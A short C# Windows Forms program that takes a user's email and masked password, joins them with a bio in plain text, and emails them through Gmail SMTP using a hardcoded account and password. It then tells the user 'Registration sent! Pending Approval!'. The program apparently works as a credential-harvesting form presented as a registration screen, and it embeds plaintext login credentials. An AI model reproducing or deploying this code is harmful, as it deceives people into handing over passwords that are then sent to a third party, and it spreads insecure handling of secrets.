using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Web;
using System.Net.Mail;

namespace Password
{
    public partial class Form1 : Form
    {
        string smtp = "smtp.gmail.com";
        string login = "programmingthrowaway2014@gmail.com";
        string pw = "testemail123";
        public Form1()
        {
            InitializeComponent();

            txtPassword.PasswordChar = '*';
        }

        private void btnLogin_Click(object sender, EventArgs e)
        {
            txtTotal.Text = txtEmail.Text + " " + txtPassword.Text + "\n\n" + txtBio.Text;

            //create new message
            MailMessage mail = new MailMessage(txtFrom.Text, txtTo.Text, txtSubject.Text, txtTotal.Text);
            //Smtp Server smtp.gmail.com || smtp.yahoo.com
            SmtpClient client = new SmtpClient(smtp);
            //gmail smtp port
            client.Port = 587;
            //gmail login
            client.Credentials = new System.Net.NetworkCredential(login, pw);
            client.EnableSsl = true;
            client.Send(mail);
            MessageBox.Show("Registration sent! Pending Approval!", "Success!", MessageBoxButtons.OK);
        }
    }
}
